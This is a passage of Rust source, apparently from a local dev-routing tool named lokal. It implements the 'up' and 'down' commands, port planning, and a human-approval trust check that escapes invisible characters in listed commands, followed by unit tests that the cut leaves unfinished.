//! `lokal up [SUB]...` and `lokal down` (SPEC §4.11).
//!
//! `up` finds and checks the repo's `lokal.toml`, asks a person to approve
//! its commands (§16.11), then routes every service in it with one locked
//! state write and one reload that waits until every name is ready (§4.5),
//! so every URL works before any command would start. `down` removes the
//! services `up` added. Services added by hand (or by `lokal run`) are
//! never touched: only those marked `managed = "lokal.toml"` (§5.2).
//!
//! The file starts in this order:
//! - pure planning, unit-tested without a daemon: [`select_starts`] (which
//!   services this `up` starts), [`plan`] (checks and ports, changes
//!   nothing), [`apply_plan`] (the state change) and [`remove_managed`]
//!   (`down`'s state change);
//! - the trust check's pure parts: [`trust_step`] (what to do) and
//!   [`listing`] (what a person reviews);
//! - then the commands, [`up`] and [`down`]: read the file, run the trust
//!   check, take the state lock, reload the daemon and print.

use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use anyhow::{Context, Result, bail};

use super::output::{self as out, dim, ok_mark};
use super::projects::{self, Applied};
use crate::error::UserError;
use crate::paths::{PROJECT_FILE, Paths};
use crate::project_file::{self, ProjectFile};
use crate::state::{self, MANAGED_BY_FILE, Project, Service, State, validate};
use crate::{approval, net, platform, runner, util};

/// The busy-port probe: a TCP connect, as `lokal run` does (§4.10).
const PROBE_TIMEOUT: Duration = Duration::from_millis(50);

pub struct UpOpts {
    /// The services to start; empty means all of them.
    pub subs: Vec<String>,
    /// `--yes`: run the commands without asking, and record no approval.
    pub yes: bool,
}

pub struct DownOpts {
    pub remove_project: bool,
    pub project: Option<String>,
}

// ───────────────────────────── planning ─────────────────────────────

/// Where a service's port comes from (§4.11, "Ports").
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PortFrom {
    /// `port` in the file.
    File,
    /// The port a service that `up` already manages has in state.
    Kept,
    /// A free port lokal picked for a new service.
    Picked,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) struct Route {
    pub port: u16,
    pub from: PortFrom,
}

/// What [`plan`] decided: the port of every service in the file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Routes {
    pub project: String,
    /// Subdomain → its route, for every service in the file.
    pub ports: BTreeMap<String, Route>,
}

/// Something already listens on the port of a service this `up` starts.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Busy {
    pub sub: String,
    pub port: u16,
    pub from: PortFrom,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Plan {
    Route(Routes),
    /// Nothing may be written or started.
    Busy(Busy),
}

/// What [`apply_plan`] changed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Synced {
    /// The project's domain: the file's apex for a new project, else the
    /// existing project's.
    pub domain: String,
    /// The FQDN of every service in the file, to wait for.
    pub ready: Vec<String>,
    /// The FQDNs of managed services that left the file, now removed.
    pub gone: Vec<String>,
    /// The project's services after the write (for `LOKAL_URL_<SUB>`).
    pub services: BTreeMap<String, Service>,
}

/// The services this `up` starts: each SUB normalised against the file's
/// apex, or every service when there are none. Every service is routed
/// either way.
pub(crate) fn select_starts(
    f: &ProjectFile,
    subs: &[String],
) -> Result<BTreeSet<String>, UserError> {
    if subs.is_empty() {
        return Ok(f.services.keys().cloned().collect());
    }
    let mut starts = BTreeSet::new();
    for raw in subs {
        let sub = validate::subdomain(raw, &f.apex)?;
        if !f.services.contains_key(&sub) {
            return Err(
                UserError::usage(format!("no service `{sub}` in {}", f.path.display())).hint(
                    format!(
                        "its services: {}",
                        f.services.keys().cloned().collect::<Vec<_>>().join(", ")
                    ),
                ),
            );
        }
        starts.insert(sub);
    }
    Ok(starts)
}

/// Decides every service's route, changing nothing. Fails on a clash (a
/// file service whose name a service `up` doesn't manage already has), a
/// domain mismatch, or an overlap for a new project. Returns
/// [`Plan::Busy`] if a service in `starts` would start on a port where
/// something already listens.
///
/// `listening` probes a `localhost` port; `pick` returns a free port that
/// isn't in the set it's given (`net::probe_tcp` and `net::pick_port` for
/// real, fakes in tests).
pub(crate) fn plan(
    st: &State,
    f: &ProjectFile,
    starts: &BTreeSet<String>,
    listening: &dyn Fn(u16) -> bool,
    pick: &mut dyn FnMut(&BTreeSet<u16>) -> Result<u16>,
) -> Result<Plan> {
    let existing = st.projects.get(&f.project);
    match existing {
        Some(p) => {
            // Without a `domain` key there's no check, as `project create`
            // without --domain accepts any existing domain.
            if let Some(d) = &f.domain
                && *d != p.domain
            {
                bail!(
                    projects::domain_mismatch(&f.project, &p.domain, d).hint(format!(
                        "set domain = \"{}\" in {PROJECT_FILE}, choose another project name there, \
or remove the project first: lokal project remove {}",
                        p.domain, f.project
                    ))
                );
            }
            let clashes: Vec<&str> = f
                .services
                .keys()
                .filter(|sub| p.services.get(*sub).is_some_and(|s| !s.is_managed()))
                .map(String::as_str)
                .collect();
            if !clashes.is_empty() {
                bail!(clash_error(&f.project, &clashes));
            }
        }
        None => validate::check_overlap(st, &f.apex, None)?,
    }

    // Picks skip every port in state (any project), every fixed port in the
    // file, and every port picked so far.
    let fixed: BTreeSet<u16> = f.services.values().filter_map(|s| s.port).collect();
    let mut taken: BTreeSet<u16> = st.services().iter().map(|e| e.service.port).collect();
    taken.extend(&fixed);
    let mut ports = BTreeMap::new();
    for (sub, fs) in &f.services {
        let kept = existing
            .and_then(|p| p.services.get(sub))
            .filter(|s| s.is_managed())
            .map(|s| s.port)
            // A port another service now fixes in the file is that service's.
            .filter(|port| !fixed.contains(port));
        let route = match (fs.port, kept) {
            (Some(port), _) => Route {
                port,
                from: PortFrom::File,
            },
            (None, Some(port)) => Route {
                port,
                from: PortFrom::Kept,
            },
            (None, None) => {
                let port = pick(&taken)?;
                taken.insert(port);
                Route {
                    port,
                    from: PortFrom::Picked,
                }
            }
        };
        ports.insert(sub.clone(), route);
    }

    // Only for services this `up` starts: one that it only routes keeps its
    // port, busy or not, because the listener may be the developer's own
    // server. A busy kept port isn't moved either: its listener is most
    // likely the same service (still under `lokal run`, or left by an `up`
    // that was killed), and a new port would start a second copy.
    for sub in starts {
        let r = ports[sub];
        if listening(r.port) {
            return Ok(Plan::Busy(Busy {
                sub: sub.clone(),
                port: r.port,
                from: r.from,
            }));
        }
    }
    Ok(Plan::Route(Routes {
        project: f.project.clone(),
        ports,
    }))
}

/// The state change for a [`Plan::Route`]: creates the project if it's
/// missing and makes it current, adds or replaces every file service as a
/// managed `localhost` route, and removes the project's managed services
/// that left the file. Services added by hand stay.
pub(crate) fn apply_plan(st: &mut State, f: &ProjectFile, r: &Routes) -> Synced {
    let p = st
        .projects
        .entry(r.project.clone())
        .or_insert_with(|| Project {
            domain: f.apex.clone(),
            created_at: util::now_rfc3339(),
            services: BTreeMap::new(),
        });
    let left: Vec<String> = p
        .services
        .iter()
        .filter(|(sub, s)| s.is_managed() && !f.services.contains_key(*sub))
        .map(|(sub, _)| sub.clone())
        .collect();
    for sub in &left {
        p.services.remove(sub);
    }
    for (sub, fs) in &f.services {
        p.services.insert(
            sub.clone(),
            Service {
                host: "localhost".into(),
                port: r.ports[sub].port,
                host_header: fs.host_header,
                managed: Some(MANAGED_BY_FILE.into()),
            },
        );
    }
    let synced = Synced {
        domain: p.domain.clone(),
        ready: f.services.keys().map(|sub| p.fqdn(sub)).collect(),
        gone: left.iter().map(|sub| p.fqdn(sub)).collect(),
        services: p.services.clone(),
    };
    st.current_project = Some(r.project.clone());
    synced
}

/// What [`remove_managed`] did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Removal {
    /// No such project.
    NoProject,
    /// The project has no managed services (and wasn't removed).
    Nothing {
        /// Its other services.
        kept: Vec<String>,
    },
    Removed {
        domain: String,
        /// The managed services removed, and their FQDNs.
        subs: Vec<String>,
        gone: Vec<String>,
        /// `--remove-project` removed the project too.
        project_removed: bool,
        /// The services that stay (added by hand).
        kept: Vec<String>,
    },
}

/// `down`'s state change: removes the project's managed services, and with
/// `remove_project` the project too if nothing else is left in it
/// (clearing `current_project` if it pointed there, as `project remove`
/// does).
pub(crate) fn remove_managed(st: &mut State, project: &str, remove_project: bool) -> Removal {
    let Some(p) = st.projects.get_mut(project) else {
        return Removal::NoProject;
    };
    let subs: Vec<String> = p
        .services
        .iter()
        .filter(|(_, s)| s.is_managed())
        .map(|(sub, _)| sub.clone())
        .collect();
    let kept: Vec<String> = p
        .services
        .keys()
        .filter(|sub| !subs.contains(sub))
        .cloned()
        .collect();
    let project_removed = remove_project && kept.is_empty();
    if subs.is_empty() && !project_removed {
        return Removal::Nothing { kept };
    }
    for sub in &subs {
        p.services.remove(sub);
    }
    let domain = p.domain.clone();
    let gone = subs.iter().map(|sub| p.fqdn(sub)).collect();
    if project_removed {
        st.projects.remove(project);
        if st.current_project.as_deref() == Some(project) {
            st.current_project = None;
        }
    }
    Removal::Removed {
        domain,
        subs,
        gone,
        project_removed,
        kept,
    }
}

fn clash_error(project: &str, clashes: &[&str]) -> UserError {
    let names = clashes.join(", ");
    let msg = match clashes {
        [one] => format!(
            "service {one} already exists and {PROJECT_FILE} doesn't manage it (added by hand, or left by lokal run)"
        ),
        _ => format!(
            "services {names} already exist and {PROJECT_FILE} doesn't manage them (added by hand, or left by lokal run)"
        ),
    };
    let hint = clashes
        .iter()
        .map(|sub| format!("lokal service remove {sub} -p {project}"))
        .collect::<Vec<_>>()
        .join("; ");
    UserError::usage(msg).hint(hint)
}

// ───────────────────────────── the trust check ─────────────────────────────

/// What the trust check does (SPEC §4.11, §16.11).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum TrustStep {
    /// A person approved these exact bytes: continue, printing nothing.
    Approved,
    /// `--yes`: print the listing and a note, continue, and record nothing.
    Yes,
    /// On a terminal: print the listing and ask. Only a `y` records an
    /// approval.
    Ask,
    /// No terminal and no `--yes`: print the listing and exit 1, changing
    /// nothing.
    Refuse {
        /// An approval exists, for other bytes.
        changed: bool,
    },
}

/// Decides the trust check from `--yes`, the stored approval and whether
/// stdin is a terminal. `--yes` always shows what it runs, approved or not.
pub(crate) fn trust_step(yes: bool, status: approval::Status, tty: bool) -> TrustStep {
    use approval::Status;
    if yes {
        return TrustStep::Yes;
    }
    match (status, tty) {
        (Status::Approved, _) => TrustStep::Approved,
        (_, true) => TrustStep::Ask,
        (status, false) => TrustStep::Refuse {
            changed: status == Status::Changed,
        },
    }
}

/// The command column of [`listing`] is at most this wide before `in <cwd>`.
const RUN_COLUMN: usize = 40;

/// What a `lokal.toml` runs, for a person to review (SPEC §4.11): every
/// service's `run` as written (`{port}` included, because no port is
/// chosen yet), its `cwd` when that isn't the file's directory, and each
/// `env` pair on its own line.
///
/// Nothing in the file can hide a command from the reader: control and
/// invisible characters are shown escaped ([`printable`]), so a `\r` or an
/// escape sequence can't make the terminal draw something else over it,
/// and every line after a line break in a value starts with `↳`, so a
/// second command can't pass for an `env` line.
pub(crate) fn listing(f: &ProjectFile) -> String {
    let name_w = f
        .services
        .keys()
        .map(|s| s.chars().count())
        .max()
        .unwrap_or(0)
        + 2;
    let indent = " ".repeat(name_w);
    let runs: Vec<Vec<String>> = f.services.values().map(|s| shown_lines(&s.run)).collect();
    let run_w = runs
        .iter()
        .map(|l| l[0].chars().count())
        .max()
        .unwrap_or(0)
        .min(RUN_COLUMN);
    let mut out = format!(
        "{} runs these commands:\n",
        printable(&f.path.display().to_string())
    );
    for ((sub, svc), run) in f.services.iter().zip(&runs) {
        let first = &run[0];
        if svc.cwd == f.dir {
            out.push_str(&format!("  {sub:<name_w$}{first}\n"));
        } else {
            // Relative to the file's directory, as in the file (without a
            // leading `./`); a cwd outside it, `..` included, as written.
            let cwd = svc.cwd.strip_prefix(&f.dir).unwrap_or(&svc.cwd);
            let cwd = printable(&cwd.display().to_string());
            out.push_str(&format!("  {sub:<name_w$}{first:<run_w$}  in {cwd}\n"));
        }
        for more in &run[1..] {
            out.push_str(&format!("  {indent}↳ {more}\n"));
        }
        for (k, v) in &svc.env {
            let v = shown_lines(v);
            out.push_str(&format!("  {indent}env {}={}\n", printable(k), v[0]));
            for more in &v[1..] {
                out.push_str(&format!("  {indent}↳ {more}\n"));
            }
        }
    }
    out
}

/// A value's lines, each [`printable`]: never empty, and a final line
/// break (which runs nothing) doesn't make an empty line.
fn shown_lines(s: &str) -> Vec<String> {
    let s = s.strip_suffix('\n').unwrap_or(s);
    s.split('\n').map(printable).collect()
}

/// `s` with every character a terminal wouldn't show as itself escaped:
/// `\n`, `\r` and `\t`, and every other control character and invisible
/// format character (bidi overrides, zero-width spaces) as `\u{…}`.
pub(crate) fn printable(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() || invisible(c) => {
                out.push_str(&format!("\\u{{{:x}}}", u32::from(c)));
            }
            c => out.push(c),
        }
    }
    out
}

/// Format characters that draw nothing, or reorder or hide what follows.
fn invisible(c: char) -> bool {
    matches!(
        c,
        '\u{ad}'
            | '\u{61c}'
            | '\u{180e}'
            | '\u{200b}'..='\u{200f}'
            | '\u{2028}'..='\u{202e}'
            | '\u{2060}'..='\u{206f}'
            | '\u{feff}'
            | '\u{fff9}'..='\u{fffb}'
    )
}

/// The trust check (SPEC §4.11 step 2, §16.11). Returns false when a person
/// said no; with no terminal and no `--yes` it fails. Either way nothing
/// has changed.
fn trust_check(paths: &Paths, f: &ProjectFile, yes: bool) -> Result<bool> {
    let status = approval::status(paths, &f.path, &f.digest);
    match trust_step(yes, status, util::stdin_is_tty()) {
        TrustStep::Approved => Ok(true),
        TrustStep::Yes => {
            print!("{}", listing(f));
            out::note("running these without asking (--yes); nothing is remembered");
            Ok(true)
        }
        TrustStep::Ask => {
            print!("{}", listing(f));
            if !out::confirm("run these commands?", false)? {
                println!("Not approved; nothing was started.");
                return Ok(false);
            }
            approval::record(paths, &f.path, &f.digest)?;
            Ok(true)
        }
        TrustStep::Refuse { changed } => {
            print!("{}", listing(f));
            bail!(refusal(f, changed))
        }
    }
}

/// No terminal and no `--yes`. The hint sends a person to the file and a
/// terminal, and never offers `--yes`: an agent reading it would just add
/// the flag (SPEC §16.11).
fn refusal(f: &ProjectFile, changed: bool) -> UserError {
    let what = if changed {
        "changed since it was approved"
    } else {
        "has commands nobody has approved yet"
    };
    UserError::runtime(format!(
        "{PROJECT_FILE} {what}: {}",
        printable(&f.path.display().to_string())
    ))
    .hint("a person should review the file, then run 'lokal up' in a terminal and answer y")
}

// ───────────────────────────── commands ─────────────────────────────

fn no_file_error(cwd: &Path) -> UserError {
    UserError::runtime(format!(
        "no {PROJECT_FILE} in {} or any parent directory",
        cwd.display()
    ))
}

/// The `lokal.toml` for the current directory, if there is one.
fn find_file() -> Result<(PathBuf, Option<PathBuf>)> {
    let cwd = std::env::current_dir().context("cannot read the current directory")?;
    let found = Paths::find_project_file(&cwd);
    Ok((cwd, found))
}

pub fn up(o: UpOpts) -> Result<i32> {
    let t = Instant::now();
    let paths = Paths::resolve()?;
    let (cwd, found) = find_file()?;
    let Some(path) = found else {
        bail!(
            no_file_error(&cwd)
                .hint("create one at the repo root, e.g. [services] then web = \"npm run dev\"")
        );
    };
    let f = project_file::load(&path)?;
    for w in &f.warnings {
        eprintln!("{} {w}", out::yellow("warning:"));
    }
    if f.project_derived {
        out::note(&project_file::derived_note(&f.project));
    }
    let starts = select_starts(&f, &o.subs)?;
    // After the file is checked, before anything changes, so a refusal
    // routes nothing and starts nothing.
    if !trust_check(&paths, &f, o.yes)? {
        return Ok(1);
    }
    let listening = |port: u16| net::probe_tcp("localhost", port, PROBE_TIMEOUT);
    let mut pick = |taken: &BTreeSet<u16>| net::pick_port(taken);
    let outcome = State::update(&paths, |st| {
        Ok(match plan(st, &f, &starts, &listening, &mut pick)? {
            Plan::Route(r) => {
                let synced = apply_plan(st, &f, &r);
                Ok((r, synced))
            }
            Plan::Busy(b) => Err(b),
        })
    })?;
    let (routes, synced) = match outcome {
        Ok(x) => x,
        // Nothing was written. The owner is looked up after the lock is
        // released: lsof takes a while.
        Err(b) => bail!(busy_error(&f, &b)),
    };
    // Even with nothing changed, this waits until every URL is ready, as a
    // repeated `service add` does.
    let a = projects::apply(&paths, &synced.ready, &synced.gone)?;
    print_routes(&f, &routes, &synced, &starts, &a, t);
    Ok(0)
}

fn busy_error(f: &ProjectFile, b: &Busy) -> UserError {
    let by = platform::current()
        .system
        .port_owner(b.port)
        .map(|owner| format!(" by {owner}"))
        .unwrap_or_default();
    let sub = &b.sub;
    let hint = match b.from {
        PortFrom::File => format!("stop that server, or change port for {sub} in {PROJECT_FILE}"),
        PortFrom::Kept => format!(
            "stop that server (is lokal run {sub} still running?), or let lokal pick a new port: \
lokal service remove {sub} -p {}, then lokal up",
            f.project
        ),
        // Free a moment ago: something took it since.
        PortFrom::Picked => "run lokal up again: it picks another free port".into(),
    };
    UserError::runtime(format!(
        "localhost:{} is already in use{by}; not starting {sub}",
        b.port
    ))
    .hint(hint)
}

fn print_routes(
    f: &ProjectFile,
    routes: &Routes,
    synced: &Synced,
    starts: &BTreeSet<String>,
    a: &Applied,
    t: Instant,
) {
    for (sub, fs) in &f.services {
        let port = routes.ports[sub].port;
        let not_started = if starts.contains(sub) {
            String::new()
        } else {
            format!("  {}", dim("(not started)"))
        };
        println!(
            "{} https://{} → localhost:{port}  {}{not_started}",
            ok_mark(),
            state::fqdn(sub, &synced.domain),
            runner::substitute_port(&fs.run, port)
        );
    }
    let took = match a {
        Applied::Ready => format!("routes ready in {}", util::fmt_duration(t.elapsed())),
        _ => "routes saved".into(),
    };
    println!("  {}", dim(&took));
    // The collisions are the same for every service: print them once.
    if let Some((sub, r)) = routes.ports.iter().next() {
        let (_, warnings) = runner::child_env(&synced.domain, &synced.services, sub, r.port);
        for w in warnings {
            eprintln!("  {} {w}", out::yellow("warning:"));
        }
    }
    projects::print_notes(a);
}

pub fn down(o: DownOpts) -> Result<i32> {
    let t = Instant::now();
    let paths = Paths::resolve()?;
    let project = match &o.project {
        Some(p) => validate::normalize(p),
        None => {
            let (cwd, found) = find_file()?;
            let Some(path) = found else {
                bail!(
                    no_file_error(&cwd)
                        .hint("run it in the repo, or name the project: lokal down -p <NAME>")
                );
            };
            // Only the name: a file with other errors still names its project.
            let (name, derived) = project_file::load_project_name(&path)?;
            if derived {
                out::note(&project_file::derived_note(&name));
            }
            name
        }
    };
    let removal = State::update(&paths, |st| {
        Ok(remove_managed(st, &project, o.remove_project))
    })?;
    let kept_note = |kept: &[String]| {
        if o.remove_project && !kept.is_empty() {
            out::note(&format!(
                "kept project {project}: it still has services that {PROJECT_FILE} doesn't manage ({})",
                kept.join(", ")
            ));
        }
    };
    match removal {
        // A repeated cleanup doesn't fail.
        Removal::NoProject => {
            println!("Nothing to remove: there is no project {project}");
        }
        Removal::Nothing { kept } => {
            println!("Nothing to remove: {PROJECT_FILE} manages no services in {project}");
            kept_note(&kept);
        }
        Removal::Removed {
            domain,
            subs,
            gone,
            project_removed,
            kept,
        } => {
            let a = projects::apply(&paths, &[], &gone)?;
            let what = match (subs.len(), project_removed) {
                (0, _) => format!("the project {domain}"),
                (n, removed) => format!(
                    "{n} service{} from {PROJECT_FILE}{}",
                    if n == 1 { "" } else { "s" },
                    if removed {
                        format!(" and the project {domain}")
                    } else {
                        String::new()
                    }
                ),
            };
            println!(
                "{} Removed {what}{}",
                ok_mark(),
                dim(&projects::timing(&a, "done", t))
            );
            kept_note(&kept);
            projects::print_notes(&a);
        }
    }
    Ok(0)
}

#[cfg(test)]
mod tests {
    use std::cell::{Cell, RefCell};

    use super::*;
    use crate::project_file::FileService;
    use crate::state::HostHeader;

    fn file(project: &str, domain: Option<&str>, services: &[(&str, Option<u16>)]) -> ProjectFile {
        let apex = domain.map_or_else(|| format!("{project}.lokal"), str::to_string);
        ProjectFile {
            path: PathBuf::from("/r/lokal.toml"),
            digest: "0".repeat(64),
            dir: PathBuf::from("/r"),
            project: project.into(),
            project_derived: false,
            domain: domain.map(str::to_string),
            apex,
            services: services
                .iter()
                .map(|(sub, port)| {
                    (
                        sub.to_string(),
                        FileService {
                            run: format!("run {sub} {{port}}"),
                            port: *port,
                            cwd: PathBuf::from("/r"),
                            host_header: HostHeader::Preserve,
                            env: vec![],
                        },
                    )
                })
                .collect(),
            warnings: vec![],
        }
    }

    fn svc(port: u16, managed: bool) -> Service {
        Service {
            host: "localhost".into(),
            port,
            host_header: HostHeader::Preserve,
            managed: managed.then(|| MANAGED_BY_FILE.to_string()),
        }
    }

    /// `(name, domain, services)` of each project.
    type Projects<'a> = &'a [(&'a str, &'a str, &'a [(&'a str, Service)])];

    fn state(projects: Projects<'_>) -> State {
        let mut st = State::default();
        for (name, domain, services) in projects {
            st.projects.insert(
                name.to_string(),
                Project {
                    domain: domain.to_string(),
                    created_at: "2026-10-25T00:00:00Z".into(),
                    services: services
                        .iter()
                        .map(|(s, v)| (s.to_string(), v.clone()))
                        .collect(),
                },
            );
        }
        st
    }

    fn all(f: &ProjectFile) -> BTreeSet<String> {
        f.services.keys().cloned().collect()
    }

    /// A picker that hands out 50000, 50001, … skipping what it's told,
    /// and records every `taken` set it saw.
    struct Picker {
        next: Cell<u16>,
        seen: RefCell<Vec<BTreeSet<u16>>>,
    }

    impl Picker {
        fn new() -> Self {
            Self {
                next: Cell::new(50000),
                seen: RefCell::new(vec![]),
            }
        }

        fn pick(&self, taken: &BTreeSet<u16>) -> Result<u16> {
            self.seen.borrow_mut().push(taken.clone());
            let mut p = self.next.get();
            while taken.contains(&p) {
                p += 1;
            }
            self.next.set(p + 1);
            Ok(p)
        }
    }

    fn plan_with(
        st: &State,
        f: &ProjectFile,
        starts: &BTreeSet<String>,
        busy: &[u16],
        picker: &Picker,
    ) -> Result<Plan> {
        let listening = |p: u16| busy.contains(&p);
        let mut pick = |t: &BTreeSet<u16>| picker.pick(t);
        plan(st, f, starts, &listening, &mut pick)
    }

    fn routes(p: Plan) -> Routes {
        match p {
            Plan::Route(r) => r,
            Plan::Busy(b) => panic!("busy: {b:?}"),
        }
    }

    fn usage_err(r: Result<Plan>) -> UserError {
        let e = r.expect_err("should fail");
        let u = e.downcast_ref::<UserError>().expect("a UserError").clone();
        assert_eq!(u.code, crate::error::EXIT_USAGE, "{}", u.message);
        u
    }

    #[test]
    fn ports_come_from_the_file_then_state_then_a_pick() {
        let st = state(&[
            (
                "shop",
                "shop.lokal",
                &[("api", svc(51234, true)), ("db", svc(5432, false))],
            ),
            ("other", "other.lokal", &[("x", svc(50000, false))]),
        ]);
        let f = file(
            "shop",
            None,
            &[
                ("@", Some(3000)),
                ("api", None),
                ("web", None),
                ("docs", None),
            ],
        );
        let picker = Picker::new();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &picker).unwrap());
        assert_eq!(r.project, "shop");
        let got: Vec<(&str, u16, PortFrom)> = r
            .ports
            .iter()
            .map(|(s, r)| (s.as_str(), r.port, r.from))
            .collect();
        assert_eq!(
            got,
            [
                ("@", 3000, PortFrom::File),
                ("api", 51234, PortFrom::Kept),
                // 50000 is another project's: skipped.
                ("docs", 50001, PortFrom::Picked),
                ("web", 50002, PortFrom::Picked),
            ]
        );
        // Every pick skips every port in state, every fixed port, and the
        // ports picked before it.
        let seen = picker.seen.borrow();
        assert_eq!(seen.len(), 2);
        for want in [51234, 5432, 50000, 3000] {
            assert!(seen.iter().all(|t| t.contains(&want)), "{want}: {seen:?}");
        }
        assert!(seen[1].contains(&50001), "{seen:?}");
    }

    #[test]
    fn a_kept_port_that_another_service_now_fixes_is_picked_again() {
        let st = state(&[("shop", "shop.lokal", &[("api", svc(51234, true))])]);
        let f = file("shop", None, &[("api", None), ("web", Some(51234))]);
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        assert_eq!(r.ports["web"].port, 51234);
        assert_eq!(r.ports["api"].from, PortFrom::Picked);
        assert_ne!(r.ports["api"].port, 51234);
    }

    #[test]
    fn a_hand_added_service_with_the_same_name_is_a_clash() {
        let st = state(&[(
            "shop",
            "shop.lokal",
            &[
                ("web", svc(3000, false)),
                ("api", svc(4000, false)),
                ("ok", svc(5000, true)),
                ("db", svc(5432, false)),
            ],
        )]);
        let f = file("shop", None, &[("web", None), ("ok", None)]);
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        assert_eq!(
            e.message,
            "service web already exists and lokal.toml doesn't manage it (added by hand, or left by lokal run)"
        );
        assert_eq!(e.hint.as_deref(), Some("lokal service remove web -p shop"));
        // Every clash, in one error.
        let f = file("shop", None, &[("web", None), ("api", None)]);
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        assert!(
            e.message
                .starts_with("services api, web already exist and lokal.toml doesn't manage them"),
            "{}",
            e.message
        );
        assert_eq!(
            e.hint.as_deref(),
            Some("lokal service remove api -p shop; lokal service remove web -p shop")
        );
        // A clash in another project doesn't count.
        let f = file("other", None, &[("web", None)]);
        routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
    }

    #[test]
    fn domain_rules() {
        let st = state(&[("shop", "shop.local", &[]), ("app", "app.lokal", &[])]);
        // A different domain fails as project create does.
        let f = file("shop", Some("shop.lokal"), &[("web", None)]);
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        assert_eq!(
            e.message,
            "project `shop` already exists with domain shop.local, not shop.lokal"
        );
        assert!(e.hint.unwrap().contains("set domain = \"shop.local\""));
        // The same domain, or no domain key, is fine.
        let f = file("shop", Some("shop.local"), &[("web", None)]);
        routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let f = file("shop", None, &[("web", None)]);
        routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        // A new project's apex mustn't overlap another project's.
        let f = file("api", Some("api.app.lokal"), &[("web", None)]);
        let e = usage_err(plan_with(&st, &f, &all(&f), &[], &Picker::new()));
        assert!(
            e.message.contains("overlaps project `app`"),
            "{}",
            e.message
        );
    }

    #[test]
    fn a_busy_port_fails_only_for_services_this_up_starts() {
        let st = state(&[("shop", "shop.lokal", &[("api", svc(51234, true))])]);
        let f = file(
            "shop",
            None,
            &[("@", Some(3000)), ("api", None), ("web", None)],
        );
        // A fixed port.
        let p = plan_with(&st, &f, &all(&f), &[3000], &Picker::new()).unwrap();
        assert_eq!(
            p,
            Plan::Busy(Busy {
                sub: "@".into(),
                port: 3000,
                from: PortFrom::File
            })
        );
        // A kept port is never moved.
        let p = plan_with(&st, &f, &all(&f), &[51234], &Picker::new()).unwrap();
        assert_eq!(
            p,
            Plan::Busy(Busy {
                sub: "api".into(),
                port: 51234,
                from: PortFrom::Kept
            })
        );
        // Services this up only routes keep their ports, busy or not.
        let only_web = BTreeSet::from(["web".to_string()]);
        let r = routes(plan_with(&st, &f, &only_web, &[3000, 51234], &Picker::new()).unwrap());
        assert_eq!(r.ports["@"].port, 3000);
        assert_eq!(r.ports["api"].port, 51234);
    }

    #[test]
    fn apply_creates_the_project_adds_marks_and_removes() {
        let mut st = state(&[
            (
                "shop",
                "shop.local",
                &[
                    ("old", svc(51000, true)),
                    ("db", svc(5432, false)),
                    ("api", svc(51234, true)),
                ],
            ),
            ("other", "other.lokal", &[]),
        ]);
        st.current_project = Some("other".into());
        let mut f = file("shop", None, &[("api", None), ("web", Some(3000))]);
        f.services.get_mut("web").unwrap().host_header = HostHeader::Upstream;
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        // The existing project's domain, not the file's default apex.
        assert_eq!(synced.domain, "shop.local");
        assert_eq!(synced.ready, ["api.shop.local", "web.shop.local"]);
        assert_eq!(synced.gone, ["old.shop.local"]);
        assert_eq!(st.current_project.as_deref(), Some("shop"));
        let p = &st.projects["shop"];
        assert_eq!(p.created_at, "2026-10-25T00:00:00Z");
        assert_eq!(p.services.keys().collect::<Vec<_>>(), ["api", "db", "web"]);
        assert_eq!(p.services["db"], svc(5432, false), "hand-added stays");
        assert_eq!(p.services["api"], svc(51234, true));
        assert_eq!(
            p.services["web"],
            Service {
                host_header: HostHeader::Upstream,
                ..svc(3000, true)
            }
        );
        assert_eq!(synced.services, p.services);
        // Again with the same file: nothing changes.
        let before = st.clone();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &Picker::new()).unwrap());
        let again = apply_plan(&mut st, &f, &r);
        assert_eq!(st, before);
        assert!(again.gone.is_empty());
        assert_eq!(again.ready, synced.ready);
    }

    #[test]
    fn apply_creates_a_missing_project_under_the_files_apex() {
        let mut st = State::default();
        let f = file("shop", Some("shop.acme.lokal"), &[("@", None)]);
        let picker = Picker::new();
        let r = routes(plan_with(&st, &f, &all(&f), &[], &picker).unwrap());
        let synced = apply_plan(&mut st, &f, &r);
        assert_eq!(synced.ready, ["shop.acme.lokal"]);
        let p = &st.projects["shop"];
        assert_eq!(p.domain, "shop.acme.lokal");
        assert!(!p.created_at.is_empty());
        assert_eq!(p.services["@"], svc(50000, true));
        assert_eq!(st.current_project.as_deref(), Some("shop"));
    }

    #[test]
    fn starts_are_normalised_against_the_files_apex() {
        let f = file("shop", None, &[("@", None), ("api", None), ("web", None)]);
        assert_eq!(select_starts(&f, &[]).unwrap(), all(&f));
        let got = select_starts(
            &f,
            &["API".into(), "web.shop.lokal".into(), "shop.lokal".into()],
        )
        .unwrap();
        assert_eq!(
            got,
            BTreeSet::from(["@".into(), "api".into(), "web".into()])
        );
        let e = select_starts(&f, &["docs".into()]).unwrap_err();
        assert_eq!(e.code, crate::error::EXIT_USAGE);
        assert_eq!(e.message, "no service `docs` in /r/lokal.toml");
        assert_eq!(e.hint.as_deref(), Some("its services: @, api, web"));
